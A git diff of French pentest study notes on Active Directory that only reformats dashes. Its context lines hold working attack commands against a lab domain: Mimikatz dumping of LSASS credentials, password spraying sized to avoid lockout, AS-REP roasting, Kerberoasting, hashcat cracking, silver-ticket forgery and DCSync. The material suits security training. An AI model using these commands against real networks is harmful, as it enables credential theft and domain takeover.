@@ -25,7 +25,7 @@ Utilisé quand :
 
 ### Kerberos
 
-Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tickets** — le client s'authentifie auprès du **KDC** (Key Distribution Center, rôle tenu par le DC), pas directement auprès du serveur applicatif.
+Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tickets** -  le client s'authentifie auprès du **KDC** (Key Distribution Center, rôle tenu par le DC), pas directement auprès du serveur applicatif.
 
 ![](assets/Pasted%20image%2020260512145508.png)
 
@@ -39,16 +39,16 @@ Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tic
 | TGS-REP  | Ticket Granting Service Reply   |
 | AP-REQ   | Application Request             |
 
-**Phase 1 — Authentification client (AS-REQ / AS-REP)**
+**Phase 1 -  Authentification client (AS-REQ / AS-REP)**
 
 1. Le client envoie un **AS-REQ** au DC : timestamp chiffré avec le hash du mot de passe
-2. Le DC déchiffre avec le hash stocké dans `ntds.dit` — si OK, renvoie un **AS-REP** contenant :
+2. Le DC déchiffre avec le hash stocké dans `ntds.dit` -  si OK, renvoie un **AS-REP** contenant :
    - Une **session key** (chiffrée avec le hash du user)
-   - Un **TGT** (Ticket Granting Ticket, chiffré avec le hash du compte `krbtgt` — le client ne peut pas le lire)
+   - Un **TGT** (Ticket Granting Ticket, chiffré avec le hash du compte `krbtgt` -  le client ne peut pas le lire)
 
 > Le TGT est valide 10h par défaut et se renouvelle sans redemander le mot de passe.
 
-**Phase 2 — Accès à un service (TGS-REQ / TGS-REP)**
+**Phase 2 -  Accès à un service (TGS-REQ / TGS-REP)**
 
 3. Le client envoie un **TGS-REQ** au KDC : username + timestamp chiffrés avec la session key + TGT + nom du service
 4. Le KDC vérifie le TGT, extrait la session key, valide le timestamp et l'IP
@@ -56,7 +56,7 @@ Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tic
    - Un **service ticket** (chiffré avec le hash du compte de service)
    - Une nouvelle session key pour communiquer avec le service
 
-**Phase 3 — Authentification auprès du service (AP-REQ)**
+**Phase 3 -  Authentification auprès du service (AP-REQ)**
 
 6. Le client envoie un **AP-REQ** au serveur applicatif : username + timestamp chiffrés avec la session key + service ticket
 7. Le serveur déchiffre le ticket avec son propre hash, vérifie le username, lit les groupes → accorde l'accès
@@ -65,7 +65,7 @@ Protocole par défaut depuis Windows Server 2003. Basé sur un système de **tic
 
 Les hashes Kerberos (TGT, session keys) et NTLM sont stockés en mémoire dans le processus **LSASS** pour le SSO. Nécessite des droits **SYSTEM ou admin local** pour y accéder.
 
-**Mimikatz — dump des hashes**
+**Mimikatz -  dump des hashes**
 
 ```powershell
 # Depuis un PowerShell élevé (admin)
@@ -79,21 +79,21 @@ sekurlsa::tickets                 # dump TGT et TGS en mémoire
 
 > `sekurlsa::logonpasswords` retourne les hashes NTLM et SHA1. Si WDigest est activé (Windows 7 ou config manuelle), les mots de passe en clair apparaissent aussi.
 
-**Mimikatz — export/import de tickets Kerberos**
+**Mimikatz -  export/import de tickets Kerberos**
 
 ```
 sekurlsa::tickets /export          # exporter les tickets sur disque (.kirbi)
 kerberos::ptt <ticket.kirbi>       # injecter un ticket dans LSASS
 ```
 
-**Mimikatz — certificats non-exportables (AD CS)**
+**Mimikatz -  certificats non-exportables (AD CS)**
 
 ```
 crypto::capi                       # patcher CryptoAPI pour rendre les clés exportables
 crypto::cng                        # patcher le service KeyIso
 ```
 
-> Activer la **LSA Protection** (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`) bloque la lecture de LSASS par Mimikatz — bypass couvert dans PEN-300.
+> Activer la **LSA Protection** (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`) bloque la lecture de LSASS par Mimikatz -  bypass couvert dans PEN-300.
 
 ## Attaques
 
@@ -109,7 +109,7 @@ Champs clés : `Lockout threshold` (tentatives avant blocage) et `Lockout observ
 
 > Règle : rester sous le seuil de lockout. Ex: seuil = 5 → max 4 tentatives par user. Avec une fenêtre de 30 min, on peut tenter ~192 passwords/24h sans déclencher de lockout.
 
-**Méthode 1 — LDAP/ADSI (PowerShell, low and slow)**
+**Méthode 1 -  LDAP/ADSI (PowerShell, low and slow)**
 
 ```powershell
 # Tester un mot de passe pour un user via DirectoryEntry
@@ -126,7 +126,7 @@ New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus
 .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
 ```
 
-**Méthode 2 — SMB avec NetExec (depuis Kali)**
+**Méthode 2 -  SMB avec NetExec (depuis Kali)**
 
 ```bash
 nxc smb <IP> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
@@ -134,9 +134,9 @@ nxc smb <IP> -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 
 > `[+]` = credentials valides. `(Pwn3d!)` = l'utilisateur est **admin local** sur la cible.
 >
-> NetExec ne vérifie pas la politique de lockout — à utiliser avec précaution.
+> NetExec ne vérifie pas la politique de lockout -  à utiliser avec précaution.
 
-**Méthode 3 — Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)**
+**Méthode 3 -  Kerberos AS-REQ avec kerbrute (furtif, 2 paquets UDP)**
 
 ```powershell
 # Windows
@@ -152,7 +152,7 @@ go build -o kerbrute .
 ./kerbrute passwordspray -d corp.com ../users.txt 'Nexus123!' --dc 192.168.193.70
 ```
 
-> Utilise uniquement AS-REQ/AS-REP — moins de trafic que SMB, pas de connexion complète établie.
+> Utilise uniquement AS-REQ/AS-REP -  moins de trafic que SMB, pas de connexion complète établie.
 
 ### AS-REP Roasting
 
@@ -161,27 +161,27 @@ Si un compte AD a l'option **"Do not require Kerberos preauthentication"** activ
 **Sans compte AD (liste de usernames requise)**
 
 ```bash
-# nxc — tester une liste de users sans mot de passe
+# nxc -  tester une liste de users sans mot de passe
 nxc ldap <IP_DC> -u users.txt -p '' --asreproast asreproast.txt --kdcHost <IP_DC>
 
-# impacket — même chose
+# impacket -  même chose
 impacket-GetNPUsers -dc-ip <IP_DC> -no-pass -usersfile users.txt corp.com/ -outputfile hashes.asreproast
 ```
 
 **Avec un compte AD**
 
 ```bash
-# Kali — énumère les users vulnérables ET récupère les hashes
+# Kali -  énumère les users vulnérables ET récupère les hashes
 impacket-GetNPUsers -dc-ip <IP_DC> -outputfile hashes.asreproast corp.com/<user>:<password>
 ```
 
 ```powershell
-# Windows (PowerView) — identifier les comptes vulnérables
+# Windows (PowerView) -  identifier les comptes vulnérables
 Get-DomainUser -PreauthNotRequired
 ```
 
 ```powershell
-# Windows (Rubeus) — récupérer les hashes
+# Windows (Rubeus) -  récupérer les hashes
 .\Rubeus.exe asreproast /nowrap
 ```
 
@@ -191,13 +191,13 @@ Get-DomainUser -PreauthNotRequired
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-> **Targeted AS-REP Roasting** : si on a `GenericWrite` ou `GenericAll` sur un compte, on peut modifier son `UserAccountControl` pour désactiver la pré-authentification, récupérer le hash, puis remettre la valeur d'origine. En pratique, **Targeted Kerberoasting** est préféré pour le même prérequis — il suffit d'ajouter un SPN sans toucher au `userAccountControl`.
+> **Targeted AS-REP Roasting** : si on a `GenericWrite` ou `GenericAll` sur un compte, on peut modifier son `UserAccountControl` pour désactiver la pré-authentification, récupérer le hash, puis remettre la valeur d'origine. En pratique, **Targeted Kerberoasting** est préféré pour le même prérequis -  il suffit d'ajouter un SPN sans toucher au `userAccountControl`.
 
 ### Kerberoasting
 
 Attaque sur l'étape **KRB_TGS_REP**. N'importe quel utilisateur du domaine (sans privilèges particuliers) peut demander un service ticket (TGS) pour n'importe quel compte possédant un SPN. Le KDC vérifie la validité du TGT mais **ne vérifie pas les permissions** de l'utilisateur sur le service. Il répond avec un TGS-REP dont une partie est chiffrée avec le hash du compte de service → crackable offline.
 
-> Cible prioritaire : les comptes **utilisateur** avec un SPN (IIS, MSSQL…). Les comptes machine, MSA et gMSA ont des mots de passe aléatoires de 120 caractères — inutile de les craquer. Même chose pour `krbtgt`.
+> Cible prioritaire : les comptes **utilisateur** avec un SPN (IIS, MSSQL…). Les comptes machine, MSA et gMSA ont des mots de passe aléatoires de 120 caractères -  inutile de les craquer. Même chose pour `krbtgt`.
 
 **Depuis Windows (Rubeus)**
 
@@ -205,13 +205,13 @@ Attaque sur l'étape **KRB_TGS_REP**. N'importe quel utilisateur du domaine (san
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
-**Depuis Kali — nxc (avec un compte valide)**
+**Depuis Kali -  nxc (avec un compte valide)**
 
 ```bash
 nxc ldap <IP_DC> -u <user> -p <password> --kdcHost <IP_DC> --kerberoasting kerberoasting.txt
 ```
 
-**Depuis Kali — impacket**
+**Depuis Kali -  impacket**
 
 ```bash
 impacket-GetUserSPNs -dc-ip <IP_DC> corp.com/<user>:<password> -outputfile hashes.kerberoast
@@ -227,7 +227,7 @@ hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt
 
 #### Kerberoasting via AS-REP Roasting
 
-Si on contrôle un compte AS-REP roastable (sans pré-auth), on peut l'utiliser pour kerberoaster d'autres comptes — sans avoir besoin d'un vrai mot de passe.
+Si on contrôle un compte AS-REP roastable (sans pré-auth), on peut l'utiliser pour kerberoaster d'autres comptes -  sans avoir besoin d'un vrai mot de passe.
 
 **NetExec**
 ```bash
@@ -250,7 +250,7 @@ GetUserSPNs.py -no-preauth <asrep_user> -usersfile services.txt -dc-host <IP_DC>
 
 Requiert `GenericAll`, `GenericWrite`, `WriteProperty` ou `Validated-SPN` sur la cible. Les membres du groupe **Account Operators** ont généralement ces droits.
 
-**Depuis Kali — targetedKerberoast.py (recommandé, gère tout automatiquement)**
+**Depuis Kali -  targetedKerberoast.py (recommandé, gère tout automatiquement)**
 
 ```bash
 git clone https://github.com/ShutdownRepo/targetedKerberoast.git
@@ -258,7 +258,7 @@ cd targetedKerberoast
 targetedKerberoast.py -v -d <domain> -u <user> -p <password>
 ```
 
-**Depuis Kali — manuellement avec nxc**
+**Depuis Kali -  manuellement avec nxc**
 
 ```bash
 # 1. Ajouter un SPN
@@ -271,7 +271,7 @@ nxc ldap <IP_DC> -d <domain> -u <user> -p <password> --kerberoasting kerberoasta
 bloodyAD -d <domain> --host <IP_DC> -u <user> -p <password> remove object <target> servicePrincipalName -v 'http/anything'
 ```
 
-**Depuis Windows — PowerView**
+**Depuis Windows -  PowerView**
 
 ```powershell
 # Vérifier que la cible n'a pas déjà un SPN
@@ -294,7 +294,7 @@ Set-DomainObject -Identity victimuser -Clear serviceprincipalname
 
 Forger un service ticket (TGS) en utilisant le hash NTLM du compte de service. L'application cible vérifie le ticket localement (chiffré avec le hash du service) sans contacter le DC → accès avec les permissions de son choix.
 
-> La validation PAC (optionnelle) est rarement activée sur les services — l'attaque fonctionne dans la grande majorité des cas.
+> La validation PAC (optionnelle) est rarement activée sur les services -  l'attaque fonctionne dans la grande majorité des cas.
 
 **Informations requises**
 
@@ -326,7 +326,7 @@ kerberos::golden /sid:<DOMAIN_SID> /domain:<DOMAIN> /target:<SPN_HOST> /service:
 ```
 
 ```
-# Exemple — forger un ticket HTTP pour web04 en tant que jeffadmin
+# Exemple -  forger un ticket HTTP pour web04 en tant que jeffadmin
 kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin /ptt
 ```
 
@@ -348,11 +348,11 @@ iwr -UseDefaultCredentials http://web04
 (iwr -UseDefaultCredentials http://web04).RawContent
 ```
 
-> Patch Microsoft (octobre 2022) : le champ `PAC_REQUESTOR` doit être validé par le DC si client et KDC sont dans le même domaine — empêche de forger des tickets pour des users inexistants, mais pas pour des users valides.
+> Patch Microsoft (octobre 2022) : le champ `PAC_REQUESTOR` doit être validé par le DC si client et KDC sont dans le même domaine -  empêche de forger des tickets pour des users inexistants, mais pas pour des users valides.
 
 ### DCSync
 
-Imite un DC pour demander la réplication des credentials d'un utilisateur via l'API `IDL_DRSGetNCChanges` (protocole DRS). Le DC cible ne vérifie pas si la demande vient d'un vrai DC — seulement que le SID a les droits requis.
+Imite un DC pour demander la réplication des credentials d'un utilisateur via l'API `IDL_DRSGetNCChanges` (protocole DRS). Le DC cible ne vérifie pas si la demande vient d'un vrai DC -  seulement que le SID a les droits requis.
 
 **Droits requis** : `Replicating Directory Changes` + `Replicating Directory Changes All`. Par défaut : membres de **Domain Admins**, **Enterprise Admins**, **Administrators**.
 
